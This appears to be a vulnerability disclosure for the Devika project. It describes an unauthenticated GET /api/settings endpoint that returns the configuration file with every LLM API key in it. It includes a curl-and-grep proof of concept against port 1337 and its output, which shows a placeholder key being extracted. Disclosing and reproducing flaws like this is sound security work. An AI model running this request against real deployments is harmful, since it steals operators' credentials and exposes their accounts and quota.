# Devika: unauthenticated disclosure of all LLM API keys via GET /api/settings

## Description

`GET /api/settings` (devika.py:195-199) returns the full `config.toml` configuration verbatim, including every real key configured under the `API_KEYS` section (CLAUDE/GEMINI/OPENAI/BING, etc.). The endpoint has no authentication.

## Impact

Any network client that can reach port 1337 obtains all LLM API keys configured on the server with a single GET — direct financial and data exposure (the attacker can consume quota and access the victim's model accounts with those keys).

## PoC

```bash
# 1. Prerequisite: any key configured in config.toml (simulating a real deployment):
#    [API_KEYS] section: CLAUDE = "sk-ant-REPRO-FAKE-KEY-9d8e"
# 2. With devika running, fetch without credentials:
curl "http://127.0.0.1:1337/api/settings" | grep -o 'sk-ant-[A-Z0-9-]*'
```

## Execution result

```
$ curl "http://127.0.0.1:1337/api/settings" | grep -o 'sk-ant-REPRO-FAKE-KEY-9d8e'
sk-ant-REPRO-FAKE-KEY-9d8e
[F02] API key disclosed unauth: YES
```
